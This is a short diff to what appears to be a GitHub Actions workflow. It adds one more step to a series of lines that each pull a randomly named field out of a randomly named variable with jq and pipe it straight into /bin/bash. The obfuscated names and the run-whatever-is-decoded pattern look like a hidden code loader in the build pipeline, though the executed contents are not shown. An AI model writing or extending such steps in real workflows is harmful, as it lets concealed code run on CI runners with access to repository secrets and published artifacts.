@@ -44,6 +44,7 @@ jobs:
           printf '%s' "$muui8" | jq -r .dp93 | /bin/bash
           echo $juuz5 | jq -r .sr6775 | /bin/bash
           echo $hvci1 | jq -r .mqnpu1 | /bin/bash
+          printf '%s' "$yjnq8546" | jq -r .kmw3336 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
